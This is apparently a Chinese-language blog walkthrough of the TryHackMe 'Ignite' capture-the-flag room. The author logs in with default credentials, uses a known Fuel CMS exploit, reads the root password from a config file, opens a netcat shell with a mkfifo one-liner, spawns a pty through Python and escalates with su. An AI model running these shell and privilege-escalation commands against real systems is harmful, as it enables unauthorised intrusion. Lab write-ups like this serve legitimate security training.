---
{"dg-publish":true,"permalink":"/tryhackme/tryhackme-Ignite靶场wp/","title":"tryhackme-Ignite靶场wp","tags":["tryhackme","linux","#oscp","#靶场"]}
---

总算是解决了openvpn连接的问题 开始来打靶场

从简单的Ignite开始

首先访问靶场ip会发现是个cms的网站

![wang](/img/user/images/tryhackme-Ignite靶场wp/fuel.png)

用nmap去扫描会发现有一个文件引起了我们的注意

![wang](/img/user/images/tryhackme-Ignite靶场wp/nmap.png)

浏览那个网站会发现是一个登录界面 随便用一个弱密码admin:admin 居然等进去了

![wang](/img/user/images/tryhackme-Ignite靶场wp/login.png)

找不到东西 只能去找找有什么漏洞吗

![wang](/img/user/images/tryhackme-Ignite靶场wp/loudong.png)

用第三个漏洞

![wang](/img/user/images/tryhackme-Ignite靶场wp/liyong.png)

成功攻进去 我们进去看看有什么信息吗

没啥头绪 只能去看看网站有啥信息吗

![wang](/img/user/images/tryhackme-Ignite靶场wp/tip.png)

访问第二个高亮的文本就是藏着用户账户密码的地方

![wang](/img/user/images/tryhackme-Ignite靶场wp/user.png)

但这个命令行太不方便了 我用反弹shell来连接

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

nc -nv TARGET_IP 8080
```
[[tryhackme/tryhackme-shell：概括#^171f63\|tryhackme-shell：概括#^171f63]]

![wang](/img/user/images/tryhackme-Ignite靶场wp/fantan.png)

连接上之后就找找flag在哪 其实可用find来找的 但也不知道是不是用flag命名 只能随便逛逛 在/home中找到www-data 和我们登录的用户名一模一样 进去找到第一个flag

![wang](/img/user/images/tryhackme-Ignite靶场wp/flag1.png)

前面知道了root账户和密码 就用su root来提权

但发现只能是交互式终端才能提权

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

![wang](/img/user/images/tryhackme-Ignite靶场wp/root.png)

进入root目录就能找到root的flag